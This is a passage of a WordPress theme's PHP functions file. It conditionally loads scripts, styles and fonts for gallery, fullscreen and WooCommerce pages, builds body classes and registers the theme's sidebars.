			wp_enqueue_style ('owlcarousel_css');
	}
	if ( is_singular('mtheme_portfolio') || is_singular('mtheme_gallery') ) {
		wp_enqueue_script ('BeforeAfterMoveJS');
		wp_enqueue_script ('BeforeAfterJS');
	}
	if ( is_singular('mtheme_gallery') ) {
		wp_enqueue_script ('fotorama');
		wp_enqueue_style ('fotoramacss');
	}
	if(is_single()) {
		wp_enqueue_script ('owlcarousel');
		wp_enqueue_style ('owlcarousel_css');
	}
	// Conditional Load jPlayer
	if ( is_archive() || is_single() || is_search() || is_home() || mtheme_is_fullscreen_home() || is_page_template('template-bloglist.php') || is_page_template('template-bloglist-small.php') || is_page_template('template-bloglist_fullwidth.php') || is_page_template('template-video-posts.php') || is_page_template('template-audio-posts.php') ) {
			wp_enqueue_script ('jPlayerJS');
			wp_enqueue_style ('css_jplayer');
	}
	// Conditional Load Contact Form
	if ( is_page_template('template-contact.php') ) {
		wp_enqueue_script ('contactform');
	}

	// Load Dynamic Styles last to over-ride all
	require_once ( MTHEME_PARENTDIR . '/css/dynamic_css.php' );
	wp_add_inline_style( 'ResponsiveCSS', $dynamic_css );

	if ( mtheme_is_fullscreen_post() ) {

		$featured_page=mtheme_get_active_fullscreen_post();
		
		if ( post_password_required ($featured_page) ) {
			wp_enqueue_script ('Background_image_stretcher');
		} else {

			$custom = get_post_custom( $featured_page );
			if ( isSet($custom[ MTHEME . "_fullscreen_type"][0]) ) {
				$fullscreen_type = $custom[ MTHEME . "_fullscreen_type"][0];
			}
			if ( isSet($custom[ MTHEME . "_fullscreentitlefont_meta"][0]) ) {
				$fullscreentitlefont_meta = $custom[ MTHEME . "_fullscreentitlefont_meta"][0];
				$slideshowtitle_meta_font = mtheme_extract_googlefont_data($fullscreentitlefont_meta);
				wp_enqueue_style( $slideshowtitle_meta_font['name'], $slideshowtitle_meta_font['url'] , array( 'MainStyle' ), null, 'screen' );
				wp_add_inline_style( 'ResponsiveCSS', ".slideshow_title, .static_slideshow_title { font-family: ".$slideshowtitle_meta_font['cssname']."; }" );
			}
			if ( isSet($custom[ MTHEME . "_fullscreentitlesize_meta"][0]) ) {
				$fullscreentitlesize_meta = $custom[ MTHEME . "_fullscreentitlesize_meta"][0];
				if ($fullscreentitlesize_meta<>"") {
					wp_add_inline_style( 'ResponsiveCSS', ".slideshow_title, .static_slideshow_title { font-size: ".$fullscreentitlesize_meta."px;line-height:".$fullscreentitlesize_meta."px; }" );
				}
			}
			if ( isSet($custom[ MTHEME . "_fullscreentitlespacing_meta"][0]) ) {
				$fullscreentitlespacing_meta = $custom[ MTHEME . "_fullscreentitlespacing_meta"][0];
				if ($fullscreentitlespacing_meta<>"") {
					wp_add_inline_style( 'ResponsiveCSS', ".slideshow_title, .static_slideshow_title { letter-spacing: ".$fullscreentitlespacing_meta."px; }" );
				}
			}
			if ( isSet($custom[ MTHEME . "_fullscreentitlelineheight_meta"][0]) ) {
				$fullscreentitlelineheight_meta = $custom[ MTHEME . "_fullscreentitlelineheight_meta"][0];
				if ($fullscreentitlelineheight_meta<>"") {
					wp_add_inline_style( 'ResponsiveCSS', ".slideshow_title, .static_slideshow_title { line-height: ".$fullscreentitlelineheight_meta."px; }" );
				}
			}
			if (is_singular('mtheme_photostory')) {
				$fullscreen_type="fotorama";
			}
			if (isSet($fullscreen_type)) {
				switch ($fullscreen_type) {

					case "photowall" :
						wp_enqueue_script ('Background_image_stretcher');
						wp_enqueue_script ('photowall_INIT');
						wp_enqueue_script ('isotope');
						wp_add_inline_style( 'ResponsiveCSS', "html{position:absolute;height:100%;width:100%;min-height:100%;min-width:100%;}" );
					break;

					case "kenburns" :
						wp_enqueue_script ('kenburns_JS');
						wp_enqueue_script ('jQTransmit_JS');
						wp_enqueue_script ('kenburns_INIT');
						wp_enqueue_style ('supersized_CSS');
						wp_add_inline_style( 'ResponsiveCSS', "html{position:absolute;height:100%;width:100%;min-height:100%;min-width:100%;}" );
					break;

					case "coverphoto" :
						wp_enqueue_script ('supersized_JS');
						wp_enqueue_script ('supersized_shutter_JS');
						wp_enqueue_style ('supersized_CSS');
						wp_enqueue_script ('TouchSwipe');
						wp_add_inline_style( 'ResponsiveCSS', "html{position:absolute;height:100%;width:100%;min-height:100%;min-width:100%;}" );
					break;

					case "particles" :
						wp_enqueue_script ('supersized_JS');
						wp_enqueue_script ('supersized_shutter_JS');
						wp_enqueue_style ('supersized_CSS');
						wp_enqueue_script ('particles_JS');
						if ( isSet($custom[ MTHEME . "_particle_type"][0]) ) {
							$particle_type = $custom[ MTHEME . "_particle_type"][0];
							if ($particle_type=="default") {
								wp_enqueue_script ('particles_draw_default');
							}
							if ($particle_type=="stars") {
								wp_enqueue_script ('particles_draw_stars');
							}
							if ($particle_type=="snow") {
								wp_enqueue_script ('particles_draw_snow');
							}
							if ($particle_type=="grab") {
								wp_enqueue_script ('particles_draw_grab');
							}
							if ($particle_type=="move") {
								wp_enqueue_script ('particles_draw_move');
							}
						}
						
						wp_add_inline_style( 'ResponsiveCSS', "html{position:absolute;height:100%;width:100%;min-height:100%;min-width:100%;}" );
					break;

					case "fotorama" :
						wp_enqueue_script ('fotorama');
						wp_enqueue_style ('fotoramacss');
						if ( isSet($custom[ MTHEME . "_fotorama_thumbnails"][0]) ) {
							$fotorama_thumbnails = $custom[ MTHEME . "_fotorama_thumbnails"][0];
							if ($fotorama_thumbnails=="disable") {
								wp_add_inline_style( 'ResponsiveCSS', ".fotorama__nav-wrap { display: none !important; }" );
							}
						}
					break;

					case "carousel" :
						wp_enqueue_script ('Background_image_stretcher');
						wp_enqueue_script ('carousel_JS');
						wp_enqueue_script ('TouchSwipe');
						wp_add_inline_style( 'ResponsiveCSS', "html{position:absolute;height:100%;width:100%;min-height:100%;min-width:100%;}" );
					break;
					
					case "slideshow" :
					case "Slideshow-plus-captions" :
						wp_enqueue_script ('supersized_JS');
						wp_enqueue_script ('supersized_shutter_JS');
						wp_enqueue_style ('supersized_CSS');
						wp_enqueue_script ('TouchSwipe');
						wp_enqueue_script ('owlcarousel');
						wp_add_inline_style( 'ResponsiveCSS', "html{position:absolute;height:100%;width:100%;min-height:100%;min-width:100%;}" );
					break;
					
					case "video" :
						if (isSet($custom[MTHEME . "_youtubevideo"][0])) {
							wp_enqueue_script ('Background_image_stretcher');
							wp_enqueue_script ('tubular');
						}
						if (isSet($custom[MTHEME . "_vimeovideo"][0])) {
							wp_add_inline_style( 'MainStyle', "body{height:1px;}" );
						}
						if ( isSet($custom[MTHEME . "_html5_mp4"][0]) || isSet($custom[MTHEME . "_html5_webm"][0]) ) {
							wp_enqueue_script('videoJS');
							wp_enqueue_style('videoJSCSS');
							wp_add_inline_style( 'ResponsiveCSS', "html{position:absolute;height:100%;width:100%;min-height:100%;min-width:100%;}" );
						}
					break;

					default:

					break;
				}
			}
		}

	}

	// Conditional Load jQueries
	if(mtheme_got_shortcode('tabs') || mtheme_got_shortcode('accordion')) {
	    wp_enqueue_script('jquery-ui-core');
	    wp_enqueue_script('jquery-ui-tabs');
	    wp_enqueue_script('jquery-ui-accordion');
	}

	if(mtheme_got_shortcode('beforeafter') ) {
		wp_enqueue_script ('BeforeAfterMoveJS');
		wp_enqueue_script ('BeforeAfterJS');
	}

	if(mtheme_got_shortcode('portfoliogrid') || is_page_template('template-eventgallery.php') || is_page_template('template-photostorygallery.php') || mtheme_got_shortcode('thumbnails') || is_post_type_archive() || is_tax() || is_singular('mtheme_gallery') || is_singular('mtheme_proofing')) {
		wp_enqueue_script ('isotope');
	}

	if(mtheme_got_shortcode('count')) { 
		wp_enqueue_script ('counter');
	}
	//Counter
	if(mtheme_got_shortcode('counter')) {  
		wp_enqueue_script ('DonutChart');
	}
	//Caraousel
	if(mtheme_got_shortcode('workscarousel')) {
		wp_enqueue_script ('owlcarousel');
		wp_enqueue_style ('owlcarousel_css');
	}
	if(mtheme_got_shortcode('woocommerce_carousel_bestselling')) {
		wp_enqueue_script ('owlcarousel');
		wp_enqueue_style ('owlcarousel_css');
	}
	if(mtheme_got_shortcode('map')) {
		wp_enqueue_script ('GoogleMaps');
	}

	if( mtheme_got_shortcode('woocommerce_featured_slideshow') || mtheme_got_shortcode('blogcarousel') || mtheme_got_shortcode('slideshowcarousel') || mtheme_got_shortcode('recent_blog_slideshow') || mtheme_got_shortcode('recent_portfolio_slideshow') || mtheme_got_shortcode('portfoliogrid') || mtheme_got_shortcode('testimonials') ) {
		wp_enqueue_script ('owlcarousel');
		wp_enqueue_style ('owlcarousel_css');
	}

	if( mtheme_got_shortcode('audioplayer') || mtheme_got_shortcode('bloglist') ) {
		wp_enqueue_script ('jPlayerJS');
		wp_enqueue_style ('css_jplayer');
	}

	if( mtheme_got_shortcode('carousel_group') ) {
		wp_enqueue_script ('owlcarousel');
		wp_enqueue_style ('owlcarousel_css');
	}

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() ) {
	// Background slideshow or image
		$bg_choice = get_post_meta( get_the_id() , MTHEME . '_meta_background_choice', true);
	}
	// Load scripts based on Background Image / Slideshow Choice
	if ( is_archive() || is_search() || is_404() ) {
		$bg_choice="default";
	}
	if ( is_home() ) {
			$bg_choice="default";
	}
	if ( mtheme_is_fullscreen_post() ) {
			$bg_choice="background_color";
	}
	if ( mtheme_page_is_woo_shop() ) {
		$woo_shop_post_id = get_option( 'woocommerce_shop_page_id' );
		$bg_choice = get_post_meta( $woo_shop_post_id , MTHEME . '_meta_background_choice', true);
	}
	if ( isSet($bg_choice) ) {
		switch ($bg_choice) { 
			case "featured_image" :
			case "custom_url" :
			case "options_image" :
				wp_enqueue_script ('Background_image_stretcher');
			break;
			case "options_slideshow" :
			case "image_attachments" :
			case "fullscreen_post" :
				wp_enqueue_script ('supersized_JS');
				wp_enqueue_script ('supersized_shutter_JS');
				wp_enqueue_style ('supersized_CSS');
				wp_enqueue_script ('TouchSwipe');
			break;
			case "video_background" :
				$current_page_check = get_post_custom(get_the_id());
				if ( mtheme_page_is_woo_shop() ) {
					$woo_shop_post_id = get_option( 'woocommerce_shop_page_id' );
					$current_page_check = get_post_custom( $woo_shop_post_id );
				}
				if (isSet($current_page_check[MTHEME . "_video_bgfullscreenpost"][0])) {
					$background_video_id = $current_page_check[MTHEME . "_video_bgfullscreenpost"][0];
					$background_video_type = get_post_custom($background_video_id);
					if (isSet($background_video_type[MTHEME . "_html5_mp4"][0])) {
						wp_enqueue_script ('Background_image_stretcher');
						if ( !wp_is_mobile() ) {
							wp_enqueue_script('videoJS');
							wp_enqueue_style('videoJSCSS');
						}
					}
					if (isSet($background_video_type[MTHEME . "_youtubevideo"][0])) {
						wp_enqueue_script ('Background_image_stretcher');
						if ( !wp_is_mobile() ) {
							wp_enqueue_script ('tubular');
						}
					}
				}
			break;

			case "background_color" :
				$background_color= get_post_meta(get_the_id(), MTHEME . '_pagebackground_color', true);
				if ( mtheme_page_is_woo_shop() ) {
					$woo_shop_post_id = get_option( 'woocommerce_shop_page_id' );
					$background_color= get_post_meta( $woo_shop_post_id, MTHEME . '_pagebackground_color', true);
				}
				if ( mtheme_is_fullscreen_home() ) {
					$fullscreen_homepage_id = mtheme_get_active_fullscreen_post();
					$background_color= get_post_meta($fullscreen_homepage_id, MTHEME . '_pagebackground_color', true);
				}
				$apply_background_color = 'body,#supersized li { background:'.$background_color.'; }';
				wp_add_inline_style( 'ResponsiveCSS', $apply_background_color );
			break;

			default :
				wp_enqueue_script ('Background_image_stretcher');
		}
	}

	if ( mtheme_page_is_woo_shop() ) {
		$woo_shop_post_id = get_option( 'woocommerce_shop_page_id' );
		// Set Opacity from Page
		$page_opacity = get_post_meta( $woo_shop_post_id, MTHEME . '_pagebackground_opacity', true);
		$page_bg_color = get_post_meta( $woo_shop_post_id , MTHEME . '_pagebackground_color', true);
		$page_bg_color_themeoptions = of_get_option('page_background');
		if ( isSet($page_opacity) && $page_opacity<>"default" && $page_opacity<>"" ) {
			// Defaults
			$dark_pagebgcolor = '#000000';
			$light_pagebgcolor = '#ffffff';

			$final_page_bgcolor = $dark_pagebgcolor;
			if ($theme_style == "light") {
				$final_page_bgcolor = $light_pagebgcolor;
			}
			// Theme Options background color is set
			if ($page_bg_color_themeoptions<>"") {
				$final_page_bgcolor = $page_bg_color_themeoptions;
			}
			// Page background color is set
			if ($page_bg_color<>"") {
				$final_page_bgcolor = $page_bg_color;
			}
			// Convert color to rgba
			$final_page_bgcolor_rgba=mtheme_hex2RGB($final_page_bgcolor,true);
			$page_opacity = $page_opacity / 100;

			$apply_pagebackground_color = '.container-wrapper { background: rgba('. $final_page_bgcolor_rgba .','.$page_opacity.'); }';
			wp_add_inline_style( 'ResponsiveCSS', $apply_pagebackground_color );
		}
	}

	if ( is_singular() ) {
		// Set Opacity from Page
		$page_opacity = get_post_meta( get_the_id() , MTHEME . '_pagebackground_opacity', true);
		$page_bg_color = get_post_meta( get_the_id() , MTHEME . '_pagebackground_color', true);
		$page_bg_color_themeoptions = of_get_option('page_background');
		if ( isSet($page_opacity) && $page_opacity<>"default" && $page_opacity<>"" ) {
			// Defaults
			$dark_pagebgcolor = '#000000';
			$light_pagebgcolor = '#ffffff';

			$final_page_bgcolor = $dark_pagebgcolor;
			if ($theme_style == "light") {
				$final_page_bgcolor = $light_pagebgcolor;
			}
			// Theme Options background color is set
			if ($page_bg_color_themeoptions<>"") {
				$final_page_bgcolor = $page_bg_color_themeoptions;
			}
			// Page background color is set
			if ($page_bg_color<>"") {
				$final_page_bgcolor = $page_bg_color;
			}
			// Convert color to rgba
			$final_page_bgcolor_rgba=mtheme_hex2RGB($final_page_bgcolor,true);
			$page_opacity = $page_opacity / 100;

			$apply_pagebackground_color = '.container-wrapper { background: rgba('. $final_page_bgcolor_rgba .','.$page_opacity.'); }';
			wp_add_inline_style( 'ResponsiveCSS', $apply_pagebackground_color );
		}

		//page title
		if( get_post_meta(get_the_id(), MTHEME . '_page_title', true) ) {
			$single_page_title = get_post_meta(get_the_id(), MTHEME . '_page_title', true);
			if (isSet($single_page_title)) {
				if ( $single_page_title == "show" ) {
					$page_single_title = '.title-container { display:block; }';
				}
				if ( $single_page_title == "hide" ) {
					$page_single_title = '.title-container { display:none; }';
				}
				if (isSet($page_single_title)) {
					wp_add_inline_style( 'ResponsiveCSS', $page_single_title );
				}
			}
		}
	}

	wp_enqueue_style( 'mtheme-ie', get_template_directory_uri() . '/css/ie.css', array( 'MainStyle' ), '' );

	// Embed a font
	if ( of_get_option('custom_font_embed')<>"" ) {
		echo stripslashes_deep( of_get_option('custom_font_embed') );
	}
	if ( of_get_option('custom_font_css')<>"" ) {
		$custom_font_css = stripslashes_deep( of_get_option('custom_font_css') );
		wp_add_inline_style( 'MainStyle', $custom_font_css );
	}

	if( is_ssl() ) {
		$protocol = 'https';
	} else {
		$protocol = 'http';
	}

	wp_enqueue_style( 'Lato', $protocol . '://fonts.googleapis.com/css?family=Lato:400,100,100italic,300,300italic,400italic,700,700italic,900,900italic' , array( 'MainStyle' ), null, 'screen' );
	wp_enqueue_style( 'Crimson', $protocol . '://fonts.googleapis.com/css?family=Crimson+Text:400,400italic,600,600italic,700,700italic' , array( 'MainStyle' ), null, 'screen' );
	wp_enqueue_style( 'PT_Mono', $protocol . '://fonts.googleapis.com/css?family=PT+Mono' , array( 'MainStyle' ), null, 'screen' );

	// ******* Load Responsive and Custom Styles

	wp_enqueue_style ('ResponsiveCSS');
	wp_enqueue_style ('CustomStyle');

	// ******* No more styles will be loaded after this line

	// Load Fonts
	// This enqueue method through the function prevent any double loading of fonts.
	$page_contents = mtheme_enqueue_font ("page_contents");
	if ($page_contents != "Default Font") {
		wp_enqueue_style( $page_contents['name'], $page_contents['url'] , array( 'MainStyle' ), null, 'screen' );
	}

	$heading_font = mtheme_enqueue_font ("heading_font");
	if ($heading_font != "Default Font") {
		wp_enqueue_style( $heading_font['name'] , $heading_font['url'] , array( 'MainStyle' ), null, 'screen' );
	}

	$menu_font = mtheme_enqueue_font ("menu_font");
	if ($menu_font != "Default Font") {
		wp_enqueue_style( $menu_font['name'], $menu_font['url'] , array( 'MainStyle' ), null, 'screen' );
	}

	$hero_font = mtheme_enqueue_font ("hero_title");
	if ($hero_font != "Default Font") {
		wp_enqueue_style( $hero_font['name'], $hero_font['url'] , array( 'MainStyle' ), null, 'screen' );
	}

}
add_action( 'wp_enqueue_scripts', 'mtheme_function_scripts_styles' );

// Pagination for Custom post type singular portfoliogallery
add_filter('redirect_canonical','mtheme_disable_redirect_canonical');
function mtheme_disable_redirect_canonical( $redirect_url ) {
    if ( is_singular( 'portfoliogallery' ) )
	$redirect_url = false;
    return $redirect_url;
}

add_filter( 'option_posts_per_page', 'mtheme_tax_filter_posts_per_page' );
function mtheme_tax_filter_posts_per_page( $value ) {
    return (is_tax('types')) ? 1 : $value;
}
// Add to Body Class
function mtheme_body_class( $classes ) {

	if ( mtheme_page_is_woo_shop() ) {
		$woo_shop_post_id = get_option( 'woocommerce_shop_page_id' );
		$mtheme_pagestyle= get_post_meta($woo_shop_post_id, MTHEME . '_pagestyle', true);
		$sidebar_position = 'wooshop-float-right';
		if ($mtheme_pagestyle=="nosidebar") {
			$sidebar_position = 'mtheme-wooshop-fullwidth';
		}
		if ($mtheme_pagestyle=="rightsidebar") {
			$sidebar_position = 'wooshop-float-right';
		}
		if ($mtheme_pagestyle=="leftsidebar") {
			$sidebar_position = 'wooshop-float-left';
		}
		$classes[] = $sidebar_position;
	}

	if ( of_get_option('rightclick_disable') ) {
		$classes[] = 'rightclick-block';
	}
	if ( ! is_multi_author() ) {
		$classes[] = 'single-author';
	}

	if ( class_exists( 'woocommerce' ) ) {
		if ( is_shop() || is_product_category() ) {
			$shop_layout = false;
			$shop_layout = of_get_option('mtheme_wooarchive_fullwidth');
			if (MTHEME_DEMO_STATUS) {
				if (isSet($_GET['shop_layout'])) {
					$shop_layout = mtheme_demo_data_fetch($_GET['shop_layout']);
					if ($shop_layout=="shop_fullwidth") {
						$shop_layout=1;
					}
				}
			}
			if ( $shop_layout ) {
				$classes[] = 'nosidebar-woo-archive';
			}
		}
	}

	if ( !is_archive() ) {
		if ( post_password_required() ) {
			$classes[] = 'mtheme-password-required';
		}
	}

	$skin_style = of_get_option('theme_style');
	if ( MTHEME_DEMO_STATUS ) {
		if (isSet($_GET['themeskin'])) {
			$skin_style = $_GET['themeskin'];
		}
	}
	$classes[] = 'theme-is-' . $skin_style;
	if ( MTHEME_DEMO_STATUS ) {
		$classes[] = 'demo';
	}

	if ( ! has_nav_menu( "main_menu" ) ) {
		$classes[] = 'mtheme-menu-inactive';
	}

	$header_menu_type = of_get_option('header_menu_type');
	if (MTHEME_DEMO_STATUS) {
		if (isSet($_GET['menu_type'])) {
			$header_menu_type = mtheme_demo_data_fetch($_GET['menu_type']);
		}
	}
	switch ($header_menu_type) {
		case 'boxed-header-middle':
			$classes[] = 'boxed-site-layout';
			$classes[] = 'middle-logo';
			break;
		case 'boxed-header-left':
			$classes[] = 'boxed-site-layout';
			$classes[] = 'left-logo';
			break;
		case 'header-middle':
			$classes[] = 'middle-logo';
			break;
		case 'header-center':
			$classes[] = 'center-logo';
			break;
		case 'header-left':
			$classes[] = 'left-logo';
			break;
		case 'vertical-menu':
			$classes[] = 'menu-is-vertical';
			break;
		case 'minimal-header':
			$classes[] = 'header-is-simple';
			$classes[] = 'middle-logo';
			break;
		
		default:
			$classes[] = 'middle-logo';
			break;
	}

	$page_data = get_post_custom( get_the_id() );

	if ( mtheme_is_fullscreen_post() ) {
		$classes[] = 'page-is-fullscreen';
		$fullscreen_type_class = mtheme_get_fullscreen_type();
		if (!isSet($fullscreen_type_class) || $fullscreen_type_class=="") {
			$fullscreen_type_class="unknown-type";
		} else {
			if ( $fullscreen_type_class == "fotorama" ) {
				$fotorama_custom = get_post_custom( mtheme_get_active_fullscreen_post() );
				if (isSet($fotorama_custom[MTHEME . "_fotorama_fill"][0])) {
					$fotorama_fill_mode=$fotorama_custom[MTHEME . "_fotorama_fill"][0];
					if ( isSet($fotorama_fill_mode) ) {
						$classes[] =  'fotorama-style-'.$fotorama_fill_mode;
					}
				}
			}
			if ( $fullscreen_type_class == "video" ) {
				$video_custom = get_post_custom( mtheme_get_active_fullscreen_post() );
				if (isSet($video_custom[MTHEME . "_youtubevideo"][0])) {
					$classes[] =  'fullscreen-video-type-youtube';
				}
				if (isSet($video_custom[MTHEME . "_vimeovideo"][0])) {
					$classes[] =  'fullscreen-video-type-vimeo';
				}
				if ( isSet($video_custom[MTHEME . "_html5_mp4"][0]) || isSet($video_custom[MTHEME . "_html5_wemb"][0]) ) {
					$classes[] =  'fullscreen-video-type-html5';
				}
			}
		}
		if (is_singular('mtheme_photostory')) {
			$fullscreen_type_class="fotorama";
			$fotorama_custom = get_post_custom( get_the_id() );
			if (isSet($fotorama_custom[MTHEME . "_fotorama_fill"][0])) {
				$fotorama_fill_mode=$fotorama_custom[MTHEME . "_fotorama_fill"][0];
				if ( isSet($fotorama_fill_mode) ) {
					$classes[] =  'fotorama-style-'.$fotorama_fill_mode;
				}
			}
		}
		$classes[] =  'fullscreen-'.$fullscreen_type_class;

		$featured_page = mtheme_get_active_fullscreen_post();
		if (defined('ICL_LANGUAGE_CODE')) { // this is to not break code in case WPML is turned off, etc.
		    $_type  = get_post_type($featured_page);
		    $featured_page = icl_object_id($featured_page, $_type, true, ICL_LANGUAGE_CODE);
		}
		$events_class = "fullscreen-eventbox-inactive";
		$custom = get_post_custom( $featured_page );
		if (isSet($custom[MTHEME . "_fullscreen_infobox"][0])){
			$fullscreen_infobox=$custom[MTHEME . "_fullscreen_infobox"][0];
			if ($fullscreen_infobox == 'events' || $fullscreen_infobox == 'woofeatured' || $fullscreen_infobox == 'portfolio' || $fullscreen_infobox == 'blog' || $fullscreen_infobox == 'worktype') {
				$events_class = "has-fullscreen-eventbox";
			}
		}
		$classes[] = $events_class;

	} else {
		$classes[] = 'page-is-not-fullscreen';
	}

	$hide_pagetitle=of_get_option('hide_pagetitle');
	if ($hide_pagetitle=="1") {
		$classes[] = 'page-without-title';
	}

	if ( is_singular() ) {
		$page_title_image = get_post_meta(get_the_id(), MTHEME . '_header_image', true);
		if ( isSet($page_title_image) && !empty($page_title_image) ) {
			$classes[] = 'has-title-background';
		} else {
			$classes[] = 'no-title-background';
		}

		if ( $hide_pagetitle <> "1" ) {
			if( get_post_meta(get_the_id(), MTHEME . '_page_title', true) ) {
				$single_page_title = get_post_meta(get_the_id(), MTHEME . '_page_title', true);
				if (isSet($single_page_title)) {
					if ( $single_page_title == "hide" ) {
						$classes[] = 'page-without-title';
					}
				}
			}
		}
	}

	$isactive = get_post_meta( get_the_id(), "mtheme_pb_isactive", true );
	if (isSet($isactive) && $isactive==1) {
		$classes[] = 'pagebuilder-active';
	}

	$classes[] = 'theme-fullwidth';
	$classes[] = 'body-dashboard-push';

	//$classes[] = 'preloading-process';

	$footerwidget_status = of_get_option('footerwidget_status');
	if ($footerwidget_status) {
		$classes[] = 'footer-is-on';
	} else {
		$classes[] = 'footer-is-off';
	}

	if ( is_singular() ) {
		if (isset($page_data[MTHEME . '_pagestyle'][0])) {
			$pagestyle = $page_data[MTHEME . '_pagestyle'][0];
			$classes[] = $pagestyle;
		}
	}

	return $classes;
}
add_filter( 'body_class', 'mtheme_body_class' );
//@ Page Menu
function mtheme_page_menu_args( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'mtheme_page_menu_args' );
/*-------------------------------------------------------------------------*/
/* Excerpt Lenght */
/*-------------------------------------------------------------------------*/
function mtheme_excerpt_length($length) {
	return 80;
}
add_filter('excerpt_length', 'mtheme_excerpt_length');
/**
 * Creates a nicely formatted and more specific title element text for output
 */
function mtheme_wp_title( $title, $sep ) {
	global $paged, $page; //WordPress-specific global variable

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'mthemelocal' ), max( $paged, $page ) );

	return $title;
}
//add_filter( 'wp_title', 'mtheme_wp_title', 10, 2 );
// Open Graph
if( of_get_option('opengraph_status') ) {
	add_filter('language_attributes', 'mtheme_opengraph_doctype');
	add_action( 'wp_head', 'mtheme_add_og_metatags', 5 );
}
/**
 * Register Sidebars.
 */
function mtheme_widgets_init() {
	// Default Sidebar
	register_sidebar(array(
		'name' => 'Default Sidebar',
		'id' => 'default_sidebar',
		'description' => __('Default sidebar selected for pages, blog posts and archives.','mthemelocal'),
		'before_widget' => '<div class="sidebar-widget"><aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside></div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
	// Social Header Sidebar
	register_sidebar(array(
		'name' => 'Fullscreen Footer',
		'id' => 'fullscreen_footer',
		'description' => __('For social widget to display social icons.','mthemelocal'),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
	// Default Portfolio Sidebar
	register_sidebar(array(
		'name' => 'Default Portfolio Sidebar',
		'id' => 'portfolio_sidebar',
		'description' => __('Default sidebar for portfolio pages.','mthemelocal'),
		'before_widget' => '<div class="sidebar-widget"><aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside></div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));	// Default Portfolio Sidebar
	register_sidebar(array(
		'name' => 'Default Events Sidebar',
		'id' => 'events_sidebar',
		'description' => __('Default sidebar for portfolio pages.','mthemelocal'),
		'before_widget' => '<div class="sidebar-widget"><aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside></div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
	register_sidebar(array(
		'name' => 'Default Proofing Sidebar',
		'id' => 'proofing_sidebar',
		'description' => __('Default sidebar for proofing pages.','mthemelocal'),
		'before_widget' => '<div class="sidebar-widget"><aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside></div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
	if ( class_exists( 'woocommerce' ) ) {
		// Default WooCommerce Sidebar
		register_sidebar(array(
			'name' => 'Default WooCommerce Sidebar',
			'id' => 'woocommerce_sidebar',
			'description' => __('Default sidebar for woocommerce pages.','mthemelocal'),
			'before_widget' => '<div class="sidebar-widget"><aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside></div>',
			'before_title' => '<h3>',
			'after_title' => '</h3>',
		));
	}

	// Dynamic Sidebar
	for ($sidebar_count=1; $sidebar_count <= MTHEME_MAX_SIDEBARS; $sidebar_count++ ) {

		if ( of_get_option('mthemesidebar-'.$sidebar_count) <> "" ) {
			register_sidebar(array(
				'name' => of_get_option('mthemesidebar-'.$sidebar_count),
				'description' => of_get_option('theme_sidebardesc'.$sidebar_count),
				'id' => 'mthemesidebar-' . $sidebar_count . '',
				'before_widget' => '<div class="sidebar-widget"><aside id="%1$s" class="widget %2$s">',
				'after_widget' => '</aside></div>',
				'before_title' => '<h3>',
				'after_title' => '</h3>',
			));
		}
	}

	// Footer
	register_sidebar(array(
		'name' => 'Footer Single Column',
		'id' => 'footer_1',
		'before_widget' => '<div class="sidebar-widget"><aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside></div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
	// Mobile Menu
	register_sidebar(array(
		'name' => 'Mobile Social Header',
		'id' => 'mobile_social_header',
		'before_widget' => '<div class="sidebar-widget"><aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside></div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
}
add_action( 'widgets_init', 'mtheme_widgets_init' );
/*-------------------------------------------------------------------------*/
/* Load Admin */
/*-------------------------------------------------------------------------*/
	require_once (MTHEME_FRAMEWORK . 'admin/admin_setup.php');
/*-------------------------------------------------------------------------*/
/* Core Libraries */
/*-------------------------------------------------------------------------*/
function mtheme_load_core_libaries() {
	require_once (MTHEME_FRAMEWORK . 'admin/tgm/tgm-init.php');
}
/*-------------------------------------------------------------------------*/
/* Theme Specific Libraries */
/*-------------------------------------------------------------------------*/
add_action('init','mtheme_load_theme_metaboxes');
function mtheme_load_theme_metaboxes() {
	require_once (MTHEME_FRAMEWORK . 'metaboxgen/metaboxgen.php');
	require_once (MTHEME_FRAMEWORK . 'metaboxes/page-metaboxes.php');
	require_once (MTHEME_FRAMEWORK . 'metaboxes/post-metaboxes.php');
	require_once (MTHEME_FRAMEWORK . 'metaboxes/portfolio-metaboxes.php');
	require_once (MTHEME_FRAMEWORK . 'metaboxes/photostory-metaboxes.php');
	require_once (MTHEME_FRAMEWORK . 'metaboxes/fullscreen-metaboxes.php');
	require_once (MTHEME_FRAMEWORK . 'metaboxes/events-metaboxes.php');
	require_once (MTHEME_FRAMEWORK . 'metaboxes/woocommerce-metaboxes.php');
	require_once (MTHEME_FRAMEWORK . 'metaboxes/proofing-metaboxes.php');
}
/*-------------------------------------------------------------------------*/
/* Load Constants : Core Libraries : Update Notifier*/
/*-------------------------------------------------------------------------*/
mtheme_load_core_libaries();
/* Custom ajax loader */
add_filter('wpcf7_ajax_loader', 'mtheme_wpcf7_ajax_loader_icon');
function mtheme_wpcf7_ajax_loader_icon () {
	return  get_template_directory_uri() . '/images/preloaders/preloader.png';
}

// If WooCommerce Plugin is active.
if ( class_exists( 'woocommerce' ) ) {

	add_action('admin_init','mtheme_update_woocommerce_images');
	function mtheme_update_woocommerce_images() {
